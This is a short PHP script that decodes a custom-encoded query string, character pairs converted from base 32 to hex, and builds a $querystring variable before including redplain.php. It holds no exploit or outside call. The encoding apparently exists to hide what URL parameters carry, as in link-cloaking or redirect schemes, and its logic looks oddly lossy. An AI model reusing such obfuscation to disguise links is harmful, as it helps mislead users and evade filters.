<?php 

$s = urldecode(trim($_SERVER['QUERY_STRING']));
if(empty($s)){ exit;}

$s = str_replace(".","",$s);
$s = str_replace("_","",$s);
$b = '';
for ($i=0; $i < strlen($s); $i+=2)
{
	$nb = substr($s,$i,2);
	$hx = base_convert($nb,32,16);
	$ch = chr(hexdec($hx));
	$b .= $ch;
}
$r=explode("-",$b);
$replace=array("~","!","@","#","$","%","&","*","(",")","/");
$reverse=strrev($r[0]);
$querystring=trim($reverse[0]).trim($r[1]);
$querystring=str_replace($replace,"!",$querystring);

include("redplain.php");
?>